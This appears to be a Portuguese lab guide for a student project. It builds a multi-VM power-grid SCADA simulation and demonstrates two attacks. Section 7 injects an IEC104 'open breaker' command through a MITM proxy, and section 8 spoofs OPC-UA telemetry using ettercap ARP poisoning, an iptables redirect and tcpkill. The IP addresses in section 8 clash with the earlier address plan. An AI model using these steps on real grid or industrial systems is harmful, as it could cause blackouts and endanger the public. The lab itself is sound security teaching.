# Guia — Simulação completa da cidade em VMs (distribuída)

Monta o cenário da cidade com **uma entidade por VM** e a **cascata funcionando
entre as máquinas**, via um **coordenador central** (a física) ligado a cada RTU
por um canal de sync ("I/O fino"). Complementa o [CENARIO_CIDADE.md](CENARIO_CIDADE.md)
(versão de host único).

## 0. Topologia

| VM | Papel | Roda | Config | Portas que abre |
|----|-------|------|--------|-----------------|
| **Coordenador** | a planta física (calcula a frequência global, UFLS, cascata) | `grid_model` + sync client | `vm_coordenador.yaml` | — (é cliente) |
| **hidro** | usina (OPC-UA) — alvo Caso 2 | server OPC-UA + plant_link + Modbus | `vm_hidro.yaml` | 4840, 7070, 5020 |
| **termica** | usina (IEC104) — alvo Caso 1 | slave IEC104 + plant_link + Modbus | `vm_termica.yaml` | 2404, 7070, 5020 |
| **industrial** | bairro (IEC104) | slave + plant_link + Modbus | `vm_industrial.yaml` | 2404, 7070, 5020 |
| **centro** | bairro (DNP3) | outstation + plant_link + Modbus | `vm_centro.yaml` | 20000, 7070, 5020 |
| **hospital** | bairro crítico (DNP3) | outstation + plant_link + Modbus | `vm_hospital.yaml` | 20000, 7070, 5020 |
| **centro-controle** | o operador (masters/clientes que polam os RTUs) | masters IEC104/DNP3 + cliente OPC-UA | `vm_centro_controle.yaml` | — (é cliente) |
| **SCADA-LTS** | HMI (Modbus) | SCADA-LTS | — | 8080 (web) |
| **atacante** | MITM on-path (Caso 1) | `mitm.py` | — | 2404 |

Três tipos de canal (não confundir):

```
 COORDENADOR ──sync :7070──► RTU ──protocolo (2404/20000/4840)──► CENTRO-CONTROLE (master)
 (física, out-of-band)        │                                    ▲
                              └──Modbus :5020──► SCADA-LTS          │  (MITM ataca AQUI)
```

- **sync :7070** (coordenador↔RTU) = lado físico (fiação/linhas). **Não** é a rede SCADA; não capture/ataque aqui.
- **protocolo** (RTU↔master) = a rede SCADA/OT. É onde o MITM entra.
- **Modbus :5020** (RTU↔SCADA-LTS) = a HMI lendo cada RTU.

## 1. Em CADA VM (uma vez)

```bash
sudo apt update && sudo apt install -y python3 python3-venv python3-pip
# copie a pasta PFC_Pinheiro_Rabelo para a VM (git, scp, pasta compartilhada...)
cd PFC_Pinheiro_Rabelo
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
```
> Python 3.10+ (Ubuntu LTS) serve. As RTUs IEC104/DNP3 não precisam de nada além do
> pyyaml; só o OPC-UA (VM-hidro) usa `asyncua`, já no requirements.

## 2. Definir os IPs (o único lugar que muda)

Escolha os IPs das VMs. Exemplo:

| VM | IP |
|----|----|
| coordenador | 192.168.56.10 |
| hidro | 192.168.56.11 |
| termica | 192.168.56.12 |
| industrial | 192.168.56.13 |
| centro | 192.168.56.14 |
| hospital | 192.168.56.15 |
| centro-controle | 192.168.56.20 |
| atacante | 192.168.56.21 |

Edite **quatro** pontos com esses IPs:

1. `config/vm_coordenador.yaml` → bloco `remotes` (os 5 IPs dos RTUs).
2. `config/vm_hidro.yaml` → `host:` (o IP REAL da VM-hidro; OPC-UA anuncia esse endpoint — não use 0.0.0.0).
3. `config/vm_centro_controle.yaml` → `host`/`url` de cada master (IPs dos RTUs).
4. Os data sources do SCADA-LTS (ajuste o host de cada um na UI depois de importar
   `scadalts/cidade_emport_distribuido.json`) → os 5 IPs dos RTUs.

## 3. Firewall (ufw) — só nas VMs que recebem conexão

```bash
# VM-hidro
sudo ufw allow 4840/tcp && sudo ufw allow 7070/tcp && sudo ufw allow 5020/tcp
# VM-termica e VM-industrial
sudo ufw allow 2404/tcp && sudo ufw allow 7070/tcp && sudo ufw allow 5020/tcp
# VM-centro e VM-hospital
sudo ufw allow 20000/tcp && sudo ufw allow 7070/tcp && sudo ufw allow 5020/tcp
# VM-atacante (só no Caso 1)
sudo ufw allow 2404/tcp
```
O **coordenador** e o **centro-controle** são clientes — não precisam abrir portas.

## 4. Subir na ordem

**1) Os 5 RTUs** (cada um na sua VM):
```bash
python3 main.py -c config/vm_hidro.yaml        # na VM-hidro
python3 main.py -c config/vm_termica.yaml      # na VM-termica
python3 main.py -c config/vm_industrial.yaml   # na VM-industrial
python3 main.py -c config/vm_centro.yaml       # na VM-centro
python3 main.py -c config/vm_hospital.yaml     # na VM-hospital
```
Cada um loga `PlantLink (RTU) ouvindo em 0.0.0.0:7070`.

**2) O coordenador** (deixe no console interativo, é dele que se controla a demo):
```bash
python3 main.py -c config/vm_coordenador.yaml
```
Loga `PlantLink (coord): conectado ao RTU ...` para cada RTU. Digite `grid status`
para ver a frequência e o estado de tudo.

**3) O centro de controle** (o operador polando os RTUs):
```bash
python3 main.py -c config/vm_centro_controle.yaml
```

**4) O SCADA-LTS** — ver seção 5.

## 5. SCADA-LTS (5 data sources, um por RTU)

A view já está pronta em `scadalts/cidade_emport_distribuido.json` (5 data sources
Modbus, um por IP de RTU) + `scadalts/cidade_bg.png`. Os IPs dos RTUs vêm do cenário
padrão; ajuste o host de cada data source na UI depois de importar, se os seus forem outros.

No SCADA-LTS (admin/admin em `http://<scada>:8080/Scada-LTS`):
1. `emport.shtm` → cole `cidade_emport_distribuido.json` → **Import**. Cria 5 data
   sources (cada um apontando para o Modbus :5020 de um RTU), os 19 data points e a view.
2. **Graphical Views → Cidade - Rede Eletrica → Edit** → envie `cidade_bg.png` como
   background → salve.
3. Confirme que os pontos ficam verdes (cada data source fala com o Modbus da sua VM).

## 6. Validar sem ataque

- No coordenador: `grid status` → frequência ~60 Hz, 2 usinas LIGADAS, 3 bairros ENERGIZADOS.
- No SCADA-LTS: tudo verde, frequência 60 Hz.

## 7. Caso 1 — Cascata (MITM IEC104 entre centro-controle e VM-termica)

**Na VM-atacante:**
```bash
python3 mitm.py --proto iec104 --listen-host 0.0.0.0 --listen-port 2404 \
                --down-host 192.168.56.12 --down-port 2404
```
(o proxy escuta na 2404 e repassa para a térmica real na .12:2404).

**No `vm_centro_controle.yaml`**, aponte o master da térmica para o **atacante** em vez
do RTU: em `op-termica`, troque `host: 192.168.56.12` por `host: 192.168.56.21` e
reinicie o centro de controle. Agora o operador fala com a térmica **através do MITM**.

**No console do `mitm.py`:**
```
s command 100 off
```
Injeta "abrir disjuntor" (IOA 100) como se fosse o operador. O comando chega ao RTU
da térmica → vai ao coordenador → a física derruba a geração → a frequência cai → a
UFLS corta **industrial** e depois **centro** → sobra só o **hospital**. Tudo visível
no SCADA-LTS (que lê os RTUs reais) e no `grid status` do coordenador.

**Reset:** no console do coordenador → `grid restore`.

## 8. Caso 2 — Falsificação de telemetria (OPC-UA, substituição de certificado)

### Demonstração distribuída contra a hidro real

Na VM atacante (`192.168.21.21`), ponha-se on-path na porta 4840 e suba o proxy
**transparente** (a vítima não é reconfigurada nem reiniciada):
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 4840 -j REDIRECT --to-port 4840
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.21.1// /192.168.21.11//
./venv/bin/python mitm.py --proto opcua --transparent
sudo timeout 3 tcpkill -i eth0 host 192.168.21.11 and tcp port 4840   # forca a reconexao
```
O centro de controle segue com o `config/vm_centro_controle.yaml` **normal**. No
console do proxy, `nodes` lista os pontos espelhados; `check Potencia_MW` compara o
valor real com o entregue à vítima; `spoof Potencia_MW 999.0` forja a leitura. O
SCADA-LTS continua lendo a hidro pelo gateway Modbus, em um caminho independente.
A captura do experimento registra essa execução com o canal OPC-UA em `NoSecurity`.

### Comparação isolada das posturas de segurança

Para demonstrar o efeito da política de confiança sem envolver as VMs da cidade,
execute o laboratório autocontido:
```bash
python3 mitm.py --proto opcua --lab
```
No console desse laboratório, compare:
```
secure none       # sem segurança
secure trustall   # assinatura e cifragem, sem validar o certificado
secure validate   # assinatura e cifragem, validando o certificado do servidor
```
Use `spoof Frequencia_Hz 60.0` ou `spoof Potencia_MW 45` para observar a falsificação.
O teste autocontido usa seu próprio servidor, proxy e vítima; ele demonstra o efeito
da validação do certificado, mas não é a execução distribuída contra a hidro real.

## 9. Notas / troubleshooting

- **O canal de sync (:7070) é andaime da simulação** — represente-o como lado físico
  no trabalho escrito, fora da rede SCADA. Nas capturas Wireshark, capture os links
  RTU↔master (2404/20000/4840), não a :7070.
- **RTU caiu?** O coordenador loga `RTU ... indisponivel` e reconecta sozinho quando ela volta.
- **OPC-UA (hidro) não conecta?** Confirme que `host:` no `vm_hidro.yaml` é o IP real da
  VM (o endpoint anunciado) e que a 4840 está liberada.
- **SCADA-LTS não atualiza um bairro?** Verifique o data source daquele IP (host/porta
  5020) e o firewall da VM do RTU.
- **Validar antes das VMs:** dá para rodar tudo num host só, em vários processos, com
  portas distintas (ver os `test_*.yaml` do desenvolvimento) — mesma lógica, sem rede.
